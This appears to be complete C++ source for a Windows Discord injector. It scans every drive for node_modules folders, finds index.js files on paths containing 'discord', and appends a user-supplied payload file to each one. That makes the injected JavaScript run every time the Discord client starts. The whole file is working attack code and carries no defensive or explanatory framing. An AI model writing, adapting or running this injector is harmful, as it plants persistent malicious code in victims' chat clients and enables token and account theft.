#include <iostream>
#include <filesystem>
#include <windows.h>
#include <fstream>
#include <algorithm>

#include "enum.h"

int main(int argc, const char* argv[])
{

	std::string payloadData;

	if (argc < 2)
	{
		std::cout << "Add payload file path" << std::endl;
		return EXIT_FAILURE;
	}
	else {
		std::filesystem::path payloadPath(argv[1]);

		if (!std::filesystem::exists(payloadPath))
		{
			std::cout << "File does not exists." << std::endl;
			return EXIT_FAILURE;
		}
		else
		{
			std::ifstream f(payloadPath, std::ios::in);

			const auto sz = std::filesystem::file_size(payloadPath);

			std::string payload(sz, '\0');

			f.read(payload.data(), sz);

			payloadData = payload;
		}
		
	}
	
	// vector to save the paths to write
	std::vector<std::filesystem::path> nodeModulePath;

	std::vector<std::filesystem::path> indexPaths;

	// vector of drives
	std::vector drives = getListOfDrives();

	// for each drive 
	for (std::vector<std::string>::const_iterator i = drives.begin(); i != drives.end(); ++i)
	{
		std::string drive = *i;

		std::filesystem::path path(drive.c_str());

		// try to find if drive is alive 
		try 
		{
			std::filesystem::recursive_directory_iterator iterator(path, std::filesystem::directory_options::skip_permission_denied);
		}
		catch (...)
		{
			continue;
		}

		// init iterator
		auto iter = std::filesystem::recursive_directory_iterator(path, std::filesystem::directory_options::skip_permission_denied);
		auto end_iter = std::filesystem::end(iter);
		auto ec = std::error_code();

		for (; iter != end_iter; iter.increment(ec))
		{
			if (ec)
			{
				std::cout << ec.message() << std::endl;
				continue;
			}
			try 
			{
					
				// add path to vector
				if (iter->path().filename() == "node_modules")
				{
					nodeModulePath.push_back(iter->path());
					iter.disable_recursion_pending();
				}
			}
			catch (const std::exception& exc)
			{
				std::cerr << exc.what();
				continue;
			}
		}
	}

	for (std::vector<std::filesystem::path>::const_iterator i = nodeModulePath.begin(); i != nodeModulePath.end(); ++i)
	{
		std::filesystem::path path = *i;
		
		// check if can acces that dir
		try
		{
			std::filesystem::recursive_directory_iterator iterator(path, std::filesystem::directory_options::skip_permission_denied);
		}
		catch (...)
		{
			continue;
		}


		auto iter = std::filesystem::recursive_directory_iterator(path, std::filesystem::directory_options::skip_permission_denied);
		auto end_iter = std::filesystem::end(iter);
		auto ec = std::error_code();

		for (; iter != end_iter; iter.increment(ec))
		{
			if (ec)
			{
				std::cout << ec.message() << std::endl;
				continue;
			}

			try
			{		
				if (iter->path().string().find("discord") != std::string::npos) {

					if (iter->path().filename() == "index.js")
					{
						indexPaths.push_back(iter->path());
						iter.disable_recursion_pending();
					}
				}

				
			}
			catch (...) {

				continue;
			}


		}

	}


	for (std::vector<std::filesystem::path>::const_iterator i = indexPaths.begin(); i != indexPaths.end(); ++i)
	{
		std::filesystem::path path = *i;

		if (payloadData.length()>1) {


		std::ofstream out;


		out.open(path, std::ios::out | std::ios::app| std::ios::binary);

		out << "\r\n" << payloadData.substr(0,payloadData.size()-2);


		out.close();

		}
	}

	return EXIT_SUCCESS;

}